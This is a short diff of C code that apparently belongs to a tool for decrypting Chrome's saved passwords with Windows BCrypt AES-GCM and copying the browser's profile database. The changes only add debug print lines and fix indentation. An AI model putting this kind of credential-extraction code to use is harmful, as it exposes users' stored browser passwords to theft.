@@ -44,6 +44,7 @@ BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypt
 	NTSTATUS status;
 	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
 	if (!NT_SUCCESS(status)) {
+		printf("came here\n");
 		return FALSE;
 	}
 
@@ -64,6 +65,7 @@ BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypt
 	/* Actual decryption process */
 	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, *decrypted_byte, *decrypted_byte_size, &size_required_decrypted_buffer, 0);
 	if (!NT_SUCCESS(status)) {
+		Debug(printf("came here2, %x\n", status);)
 		return FALSE;
 	}
 
@@ -159,7 +161,7 @@ BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WO
 		}
 		if ((err = strcat_s(new_database, MAX_PATH, "2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
 			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending profile name to database_location error: %d\n", err);)
-				return FALSE;
+			return FALSE;
 		}
 		if (!CopyFileA(temp_database_location, new_database, FALSE)) {
 			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Making copy of database error. Trying to continue.\n");)
